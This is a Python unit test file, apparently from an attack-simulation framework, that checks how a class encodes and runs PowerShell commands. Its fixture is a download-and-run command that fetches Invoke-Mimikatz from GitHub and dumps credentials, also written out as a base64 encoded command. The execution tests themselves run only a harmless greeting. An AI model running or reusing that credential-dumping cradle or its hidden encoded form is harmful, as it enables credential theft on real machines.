from ai_utils.phases.encode_and_execute_powershell_script import EncodeAndExecutePowershellScriptPhaseClass
from ai_utils.ai_logging.simplelogger import AiLoggerClass
from ai_utils.scenarios.globals import PathUtils
import unittest
import logging


class TestSaveFileAndUsablePhaseClass(unittest.TestCase):

  def setUp(self):
    self.powershell_basic_script = 'Write-Host "Hello, World!"'
    self.plain_string = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
    self.expected_string = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AbQBhAHQAdABpAGYAZQBzAHQAYQB0AGkAbwBuAC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBFAHgAZgBpAGwAdAByAGEAdABpAG8AbgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMA'
    AiLoggerClass(loggingLevel=logging.DEBUG).Enable()

  def test_prepare_powershell_command(self):
    expected_command = ' -InputFormat None -EncodedCommand "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AbQBhAHQAdABpAGYAZQBzAHQAYQB0AGkAbwBuAC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBFAHgAZgBpAGwAdAByAGEAdABpAG8AbgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMA" '
    phase_class = EncodeAndExecutePowershellScriptPhaseClass(True, self.plain_string, True)
    powershell_command = phase_class.prepare_powershell_command()
    self.assertEqual(powershell_command, expected_command)

  def test_encode_powershell_command(self):
    encoded_string = EncodeAndExecutePowershellScriptPhaseClass.encode_powershell_command(self.plain_string)
    self.assertEqual(encoded_string, self.expected_string)

  def test_check_if_successful_pass(self):
    exit_code = 0
    error_code = 0
    phase_class = EncodeAndExecutePowershellScriptPhaseClass(True, "", True)
    self.assertTrue(phase_class.get_execution_outcome(exit_code, error_code))

  def test_check_if_successful_fail(self):
    exit_code = 3
    error_code = 1
    phase_class = EncodeAndExecutePowershellScriptPhaseClass(True, "", True)
    self.assertFalse(phase_class.get_execution_outcome(exit_code, error_code))

  def test_execute_powershell_command(self):
    phase_class = EncodeAndExecutePowershellScriptPhaseClass(True, "", False)
    execution_outcome = phase_class.execute_powershell_command(self.powershell_basic_script)
    self.assertTrue(execution_outcome)

  def test_execute_powershell_command_ai_python(self):
    phase_class = EncodeAndExecutePowershellScriptPhaseClass(True, "", False)
    execution_outcome = phase_class.execute_powershell_command_aipython(self.powershell_basic_script)
    self.assertTrue(execution_outcome)
